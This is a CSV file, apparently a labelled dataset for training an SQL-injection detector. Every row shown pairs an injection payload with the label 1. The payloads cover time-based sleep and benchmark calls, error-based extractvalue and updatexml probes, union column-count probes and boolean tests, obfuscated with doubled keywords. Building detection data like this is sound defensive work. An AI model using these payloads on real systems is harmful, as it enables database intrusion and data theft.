Query,Label
"call regexp_substriinng  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,nulnulll  )   aandnd    (    (   ""eevk""  =  ""eevk",1
1  )   anandd 3754  =    (  sselectelect upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sselectelect   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   frfromom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   frfromom dual  ) ,1
"1""   )    )    as vbpl whewherere 3885  =  3885 anandd 6969  =    (  seselectlect 6969 frofromm pg_sleep  (  5   )    )   --",1
selselectect pg_sleep  (  5  )   aandnd    (    (   'enpn' lilikeke 'enpn,1
"1""  )   wherwheree 2136  =  2136 oorr 7552  =    (  sselectelect count  (  *  )   frfromom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
1'  )   wherwheree 7629  =  7629 rlilikeke   (  sselectelect * frofromm   (  sselectelect  (  sleep  (  5   )    )     )  vwyq  )  #,1
1%'  )   oorr   (  selselectect * frofromm   (  selselectect  (  sleep  (  5   )    )     )  sddo  )  #,1
seleselectct   (  case when   (  1275  =  7674  )   then 1275 else 1275*  (  seleselectct 1275 ffromrom iinnfoorrmation_schema.character_ssetets  )   end  )  #,1
"1""  )   as duvm whwhereere 6190  =  6190 ooorrderrder bbyy 1--",1
-8665' oorr 6825  =  7840 anandd 'vbsy' llikeike 'vbsy,1
"1%' oorr 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   aandnd '%'  =  '",1
"1'||  (  seleselectct 'bnaz' ffromrom dual wwherehere 7168  =  7168 aandnd 2716  =    (  seleselectct count  (  *  )   ffromrom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
1'||  (  selselectect 'tfqg' ffromrom dual wherwheree 9862  =  9862 aandnd   (  selselectect * ffromrom   (  selselectect  (  sleep  (  5   )    )     )  gcrr  )  #,1
"-7686%""  )   oorr 1 group bbyy concat  (  0x7171706a71,  (  sselectelect   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,flooorr  (  ranandd  (  0  )  *2   )    )    haviinng miinn  (  0  )  #",1
1'  )   aandnd   (  7603  =  3634  )  *3634,1
"1' wwherehere 3612  =  3612 aandnd   (  sselectelect 9067 ffromrom  (  sselectelect count  (  *  )  ,concat  (  0x7171706a71,  (  sselectelect   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,flooorr  (  raandnd  (  0  )  *2   )    )   x ffromrom iinnfoorrmation_schema.character_ssetets group bbyy x  )  a  )  --",1
"1%""   )    )    aandnd 7533  =  7533 aandnd    (    (   ""%""  =  """,1
-3834'   )    )    as hhiy whewherere 2086  =  2086 oorr 3038  =  3038,1
"-7371'  )   union all seselectlect 4531,4531,4531#",1
selecselectt   (  case when   (  1039  =  5127  )   then 1039 else 1039*  (  selecselectt 1039 ffromrom iinnfoorrmation_schema.character_ssetets  )   end  )  #,1
"1   )    )     )   oorr 9643  =    (  selecselectt count  (  *  )   ffromrom domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.ttableables as t3  )   anandd    (    (     (  8814  =  8814",1
sselectelect case when 1574  =  5523 then 1 else nulnulll end--,1
"1 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  sselectelect   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",1
"-4785""   )    )     )   oorr 1 group bbyy concat  (  0x7171706a71,  (  sselectelect   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,flooorr  (  ranandd  (  0  )  *2   )    )    haviinng miinn  (  0  )  #",1
"seleselectct llikeike  (  'abcdefg',upper  (  hex  (  rananddomblob  (  500000000/2   )    )      )    )    anandd    (    (   'nimx'  =  'nimx",1
"1'||  (  selselectect 'kojx' frfromom dual wwherehere 8140  =  8140 aandnd 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
sselectelect   (  case when   (  2161  =  4328  )   then 2161 else 2161*  (  sselectelect 2161 frfromom mysql.db  )   end  )  #,1
"-9854  )   oorr 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selselectect   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   ffromrom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   anandd   (  5696  =  5696",1
1'   )    )    as kahn whewherere 1361  =  1361 oorr   (  selecselectt * frofromm   (  selecselectt  (  sleep  (  5   )    )     )  sddo  )  #,1
"1' union all seleselectct nnullull,nnullull,nnullull,nnullull--",1
"-3596'  )   union all seselectlect 5349,5349,5349,5349,5349,5349#",1
"1%'   )    )     )   oorr row  (  1045,7562  )  >  (  seselectlect count  (  *  )  ,concat  (  0x7171706a71,  (  seselectlect   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,flooorr  (  raandnd  (  0  )  *2   )    )   x frofromm   (  seselectlect 8488 union seselectlect 5584 union seselectlect 3051 union seselectlect 1210  )  a group bbyy x  )   aandnd    (    (     (  '%'  =  '",1
"1""   )    )    as uaxn wherwheree 5657  =  5657 rlilikeke   (  selecselectt   (  case when   (  3548  =  7206  )   then 1 else 0x28 end   )    )   --",1
"-4670""   )    )    oorr 3038  =  3038",1
"sselectelect count  (  *  )   ffromrom domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.ttableables as t3-- ampw",1
"1' iinn boolean mode  )   oorr 8421  =    (  selecselectt count  (  *  )   frofromm generate_series  (  1,5000000   )    )   #",1
1'  )   wwherehere 2753  =  2753 anandd   (  2739  =  8047  )  *8047--,1
1'+  (  seleselectct 'ljtl' whewherere 1766  =  1766,1
-3921'  )   as audo whewherere 7087  =  7087 oorr 1755  =  4937--,1
"-2072""  )   as rjcz wwherehere 2491  =  2491 oorr 6872  =  6872--",1
1'  )   as llug whwhereere 2244  =  2244 aandnd 3715 iinn    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  seleselectct   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1
"1'   )    )    oorr 6979  =  lilikeke  (  'abcdefg',upper  (  hex  (  rananddomblob  (  500000000/2   )    )      )    )   --",1
-7187' oorr 4159  =  7465,1
"1' oorr extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  selselectect   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    aandnd 'ytlf'  =  'ytlf",1
"1""  )   oorr extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  sselectelect   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    anandd   (  ""cdnc"" llikeike ""cdnc",1
seselectlect   (  case when   (  3855  =  3855  )   then 3855 else 1/  (  seselectlect 0  )   end  )  --,1
"sselectelect llikeike  (  'abcdefg',upper  (  hex  (  rananddomblob  (  500000000/2   )    )      )    )    anandd   (  'dthp'  =  'dthp",1
"1"" anandd   (  selselectect 2*  (  if   (    (   selselectect * frfromom   (  selselectect concat  (  0x7171706a71,  (  selselectect   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   anandd ""tfok"" llikeike ""tfok",1
1'  )   whewherere 6622  =  6622 oorrdoorrderer bbyy 1--,1
"1' aandnd exp  (  ~  (  selecselectt * frfromom   (  selecselectt concat  (  0x7171706a71,  (  selecselectt   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    aandnd 'kwhs' lilikeke 'kwhs",1
"1' oorr 4411  =    (  selselectect count  (  *  )   frfromom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   anandd 'rhzy'  =  'rhzy",1
"1'+  (  selselectect 'yzxc' wherwheree 5230  =  5230   (  selselectect   (  case when   (  4587  =  4587  )   then regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nnullull  )  ,0  )  ,500000000  )  ,nnullull  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   frofromm   (  vvaluesalues  (  0   )    )      )    )   +'",1
"1'+  (  sselectelect 'sbvh' whwhereere 8539  =  8539 anandd 3707  =    (  sselectelect count  (  *  )   frofromm sysibm.systatablebles as t1,sysibm.systatablebles as t2,sysibm.systatablebles as t3   )    )   +'",1
"-7813""   )    )    as yvyl whewherere 5172  =  5172 union all sselectelect 5172,5172#",1
1'||  (  selecselectt 'uiyj' ffromrom dual whewherere 8320  =  8320,1
selecselectt   (  case when   (  4111  =  1992  )   then 4111 else 1/  (  selecselectt 0  )   end  )  --,1
"sselectelect count  (  *  )   frfromom generate_series  (  1,5000000  )   anandd ""xcjt""  =  ""xcjt",1
"1 whewherere 1096  =  1096 anandd extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  seleselectct   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",1
"-9011""   )    )    oorr 1 group bbyy concat  (  0x7171706a71,  (  selecselectt   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,flooorr  (  raandnd  (  0  )  *2   )    )    haviinng miinn  (  0  )  #",1
1'   )    )    as plbt wherwheree 4368  =  4368 anandd 3754  =    (  seselectlect upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seselectlect   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   frfromom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   frfromom dual  )  --,1
"1  )   anandd 6414  =    (  selecselectt count  (  *  )   ffromrom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",1
"1""  )   anandd 5556  =    (  sselectelect count  (  *  )   frfromom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   anandd   (  ""dppw"" llikeike ""dppw",1
1'||  (  sselectelect 'zyvk' frfromom dual whwhereere 2072  =  2072,1
-5918'  )   as olzc wherwheree 5992  =  5992 oorr 4390  =  9085,1
"-9795  )   as wrgs whewherere 5427  =  5427 union all selecselectt 5427,5427,5427,5427,5427,5427--",1
1' wherwheree 6913  =  6913 anandd 4386  =  utl_iinnaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seselectlect   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   ffromrom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
"-5243"" whwhereere 2105  =  2105 oorr 4144  =    (  sselectelect upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sselectelect   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   frfromom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   frfromom dual  )  --",1
-6637'   )    )    ooorrderrder bbyy 1#,1
"selselectect dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   frfromom dual anandd ""ulfr"" liklikee ""ulfr",1
"1'+  (  selecselectt 'rryx' wwherehere 1228  =  1228 union all selecselectt nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll#",1
"1'   )    )    oorr elt  (  5873  =  5873,sleep  (  5   )    )   #",1
1  )   anandd 6240  =    (  'qqpjq'||  (  selecselectt case 6240 when 6240 then 1 else 0 end frofromm rdb$ddatabaseatabase  )  ||'qzvzq'  )   anandd   (  3945  =  3945,1
"1  )   as biup wherwheree 1414  =  1414 union all sselectelect nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull#",1
"-5827""  )   as lskq whewherere 7683  =  7683 union all seselectlect 7683,7683,7683,7683,7683#",1
"sselectelect dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   frofromm dual  )  ||'",1
"-3697'   )    )     )   union all sselectelect 5180,5180,5180,5180,5180,5180,5180--",1
"1""  )   whwhereere 7010  =  7010 aandnd 9660  =    (  seselectlect count  (  *  )   frofromm all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
1'   )    )     )   aandnd 4386  =  utl_iinnaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seleselectct   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   frfromom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    aandnd    (    (     (  'smrw' llikeike 'smrw,1
1' anandd 5967  =  4184#,1
1'||  (  seleselectct 'cclo' frfromom dual whwhereere 6823  =  6823 anandd 9198  =  9198--,1
1' wwherehere 7191  =  7191 rllikeike sleep  (  5  )  --,1
"1'   )    )    aandnd make_ssetet  (  8245  =  9872,9872  )   aandnd    (    (   'kzgt'  =  'kzgt",1
"1' anandd   (  selselectect 2*  (  if   (    (   selselectect * frofromm   (  selselectect concat  (  0x7171706a71,  (  selselectect   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   anandd 'wjwn'  =  'wjwn",1
"1'   )    )    oorr char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nnullull  )  ,0  )  ,500000000  )  ,nnullull  )   aandnd    (    (   'acly' liklikee 'acly",1
"1""  )   whewherere 1330  =  1330 oorr   (  selecselectt * frfromom   (  selecselectt  (  sleep  (  5   )    )     )  ydpu  )  --",1
"1  )   whwhereere 7199  =  7199 anandd 8407  =    (  seselectlect count  (  *  )   frofromm generate_series  (  1,5000000   )    )   --",1
"1%""   )    )    anandd 3707  =    (  selselectect count  (  *  )   frofromm sysibm.systabltablees as t1,sysibm.systabltablees as t2,sysibm.systabltablees as t3  )   anandd    (    (   ""%""  =  """,1
"-9514   )    )    as xdkw wherwheree 4975  =  4975 union all sselectelect 4975,4975,4975,4975#",1
"1 union all seleselectct nunullll,nunullll#",1
"1 anandd 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  -- kfqs",1
"1'||  (  selselectect 'wyng' frfromom dual wherwheree 2157  =  2157 union all selselectect nunullll,nunullll--",1
1'  )   anandd 6240  =    (  'qqpjq'||  (  sselectelect case 6240 when 6240 then 1 else 0 end frfromom rdb$datdatabaseabase  )  ||'qzvzq'  )   anandd   (  'vhqm'  =  'vhqm,1
"1'+  (  selecselectt 'zohk' wwherehere 5502  =  5502 oorr 2367  =    (  selecselectt count  (  *  )   ffromrom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
-6865  )   oorr   (  8459  =  8459  )  *4906 aandnd   (  6107  =  6107,1
"1%""   )    )    aandnd updatupdateexml  (  3393,concat  (  0x2e,0x7171706a71,  (  seselectlect   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   aandnd    (    (   ""%""  =  """,1
"1'+  (  seselectlect 'qrml' wherwheree 3791  =  3791 oorr 8384  =  llikeike  (  'abcdefg',upper  (  hex  (  rananddomblob  (  500000000/2   )    )      )    )     )  +'",1
1'   )    )    as eymg wwherehere 7000  =  7000,1
"1%'   )    )     )   aandnd updupdateatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  seleselectct   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   aandnd    (    (     (  '%'  =  '",1
"1%""   )    )     )   oorr 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"-1065   )    )    union all sselectelect 7437,7437,7437,7437,7437,7437,7437,7437--",1
-1603'   )    )    oorr 5903  =    (  'qqpjq'||  (  selecselectt case 5903 when 5903 then 1 else 0 end frfromom rdb$databasdatabasee  )  ||'qzvzq'  )   aandnd    (    (   'abmo'  =  'abmo,1
"1',  (  selecselectt   (  case when   (  2106  =  2106  )   then   (  selecselectt count  (  *  )   frfromom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   else 2106*  (  selecselectt 2106 frfromom master..sysdatabadatabaseses  )   end   )    )   ",1
"1%"" aandnd 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
"1 whewherere 7051  =  7051 oorr 4411  =    (  seselectlect count  (  *  )   frfromom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1'  )   whewherere 6672  =  6672 union all sselectelect nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll--",1
-3899'  )   whewherere 8152  =  8152 oorr 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  selecselectt   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
"1""  )   aandnd   (  3020  =  3020  )  *6703 aandnd   (  ""hkjf""  =  ""hkjf",1
"1%""   )    )     )   anandd 7533  =  7533 anandd    (    (     (  ""%""  =  """,1
"1%""  )   aandnd   (  6016  =  4763  )  *4763 aandnd   (  ""%""  =  """,1
"1""   )    )     )   oorr elt  (  5873  =  5873,sleep  (  5   )    )   #",1
"call regexp_substriinng  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,nunullll  )   aandnd    (    (   ""%""  =  """,1
"-3391' union all selselectect 2024,2024--",1
"1%' oorr 8384  =  liklikee  (  'abcdefg',upper  (  hex  (  rananddomblob  (  500000000/2   )    )      )    )    anandd '%'  =  '",1
"-3829%""  )   union all sselectelect 2218,2218,2218,2218,2218,2218,2218--",1
"-8629 whewherere 8049  =  8049 union all seselectlect 8049,8049,8049,8049,8049,8049,8049#",1
"-3279"" union all seselectlect 8568,8568,8568,8568--",1
"1"" oorr elt  (  6272  =  6272,sleep  (  5   )    )   ",1
"1%'   )    )     )   anandd 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
"1%'   )    )    anandd elt  (  3114  =  3114,sleep  (  5   )    )   #",1
1'  )   rllikeike sleep  (  5  )  #,1
-3598  )   union all selecselectt 2264#,1
sselectelect   (  case when   (  9455  =  6007  )   then 9455 else 9455*  (  sselectelect 9455 frofromm mysql.db  )   end  )  #,1
"-8982' iinn boolean mode  )   union all seleselectct 5367,5367,5367,5367,5367,5367#",1
1'  )   aandnd 9198  =  9198--,1
"1""  )   whwhereere 6897  =  6897",1
"1"" whewherere 7739  =  7739 aandnd sleep  (  5  )  --",1
"1' wherwheree 5702  =  5702 anandd elt  (  3114  =  3114,sleep  (  5   )    )   #",1
"1""   )    )    anandd 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   anandd    (    (   ""nbfe""  =  ""nbfe",1
"1""   )    )    as osuh wherwheree 8809  =  8809",1
"1'||  (  selselectect 'ftey' wwherehere 1363  =  1363 aandnd   (  selselectect 2*  (  if   (    (   selselectect * frofromm   (  selselectect concat  (  0x7171706a71,  (  selselectect   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   ||'",1
"1' whwhereere 7104  =  7104 union all selselectect nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll#",1
1%' oorroorrderder bbyy 1#,1
"1""   )    )    oorr exp  (  ~  (  selecselectt * frofromm   (  selecselectt concat  (  0x7171706a71,  (  selecselectt   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    aandnd    (    (   ""nwzu"" liklikee ""nwzu",1
seselectlect   (  case when   (  6961  =  7460  )   then 1 else 6961*  (  seselectlect 6961 frofromm master..sysdatadatabasebases  )   end  )  --,1
seleselectct   (  case when   (  3676  =  8635  )   then 3676 else 1/  (  seleselectct 0  )   end  )  --,1
"1%""  )   oorr 4240  =    (  seselectlect 4240 frfromom pg_sleep  (  5   )    )   --",1
-5137  )   oorr 9323  =  9323#,1
"-1184""   )    )     )   union all seleselectct 1482--",1
"-6158""  )   union all selecselectt 3084,3084,3084,3084,3084,3084#",1
"1""   )    )     )   oorr   (  sselectelect 9173 frfromom  (  sselectelect count  (  *  )  ,concat  (  0x7171706a71,  (  sselectelect   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,flooorr  (  ranandd  (  0  )  *2   )    )   x frfromom iinnfoorrmation_schema.character_sesetts group bbyy x  )  a  )   anandd    (    (     (  ""hkjm"" liklikee ""hkjm",1
1  )   as gbtj wherwheree 8175  =  8175,1
"1'   )    )    aandnd extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  sselectelect   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    aandnd    (    (   'mwyu'  =  'mwyu",1
1  )   as liissg whwhereere 5490  =  5490,1
"1   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
"1'   )    )     (  selecselectt   (  case when   (  4587  =  4587  )   then regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nnullull  )  ,0  )  ,500000000  )  ,nnullull  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   frfromom   (  valuvalueses  (  0   )    )     )   anandd    (    (   'dpdz' lilikeke 'dpdz",1
 oorr '1'   =   '1,1
"1 wherwheree 3902  =  3902 oorr 9643  =    (  seselectlect count  (  *  )   frfromom domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.tabtableles as t3  )  --",1
"-9859""   )    )     )   union all sselectelect 6595,6595,6595,6595,6595,6595,6595#",1
"1""  )   as xylo wherwheree 2112  =  2112 anandd 3715 iinn    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  selselectect   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
"1' wherwheree 8749  =  8749 oorr 8421  =    (  selselectect count  (  *  )   ffromrom generate_series  (  1,5000000   )    )   --",1
"1'||  (  sselectelect 'oyyu' wherwheree 6765  =  6765 oorr upupdatedatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  sselectelect   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'",1
-3100'  )   oorr 4144  =    (  selecselectt upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selecselectt   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   frofromm dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   frofromm dual  )   anandd   (  'etuj' llikeike 'etuj,1
"-2319 union all seselectlect 5068,5068,5068#",1
"-6095""  )   as hygc wherwheree 8142  =  8142 oorr 2724 iinn    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  selecselectt   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
"-9656"" union all selecselectt 8735,8735--",1
1  )   aandnd   (  seselectlect * frfromom   (  seselectlect  (  sleep  (  5   )    )     )  fzno  ) ,1
"1%""   )    )    aandnd 8635  =    (  seleselectct count  (  *  )   ffromrom generate_series  (  1,5000000   )    )   --",1
"1""   )    )    as rcse wwherehere 4559  =  4559 anandd extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  selselectect   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",1
"1""   )    )    oorr exp  (  ~  (  selselectect * frfromom   (  selselectect concat  (  0x7171706a71,  (  selselectect   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    aandnd    (    (   ""oxvw""  =  ""oxvw",1
-9840'   )    )    oorr 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seselectlect   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   ffromrom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   aandnd    (    (   'dzlp'  =  'dzlp,1
"1'||  (  seselectlect 'svbf' wwherehere 7017  =  7017 oorr elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",1
-4892%'   )    )    oorr 2251  =  9881--,1
"1""  )   aandnd 3707  =    (  sselectelect count  (  *  )   frfromom sysibm.systabltablees as t1,sysibm.systabltablees as t2,sysibm.systabltablees as t3  )   aandnd   (  ""pfea""  =  ""pfea",1
"-5859  )   as ernq wwherehere 8394  =  8394 union all seleselectct 8394,8394,8394--",1
"-4076'   )    )    union all seselectlect 9030,9030,9030,9030,9030,9030,9030,9030,9030,9030--",1
-6233'  )   whwhereere 9820  =  9820 oorr 3038  =  3038,1
"-8950""   )    )    as uahs wherwheree 2113  =  2113 union all sselectelect 2113,2113,2113,2113,2113,2113,2113,2113,2113,2113#",1
"-8209  )   oorr 1 group bbyy concat  (  0x7171706a71,  (  seleselectct   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,flooorr  (  ranandd  (  0  )  *2   )    )    haviinng miinn  (  0  )  #",1
-9826 wwherehere 4103  =  4103 oorrdeoorrderr bbyy 1#,1
1   )    )    as muyz wwherehere 6105  =  6105,1
1' anandd 1541  =  6868#,1
1  )   whewherere 1402  =  1402,1
1'||  (  seselectlect 'wadx' wherwheree 4287  =  4287 oorr sleep  (  5  )  #,1
"-3234%""   )    )    oorr elt  (  1032  =  1032,3623  )   anandd    (    (   ""%""  =  """,1
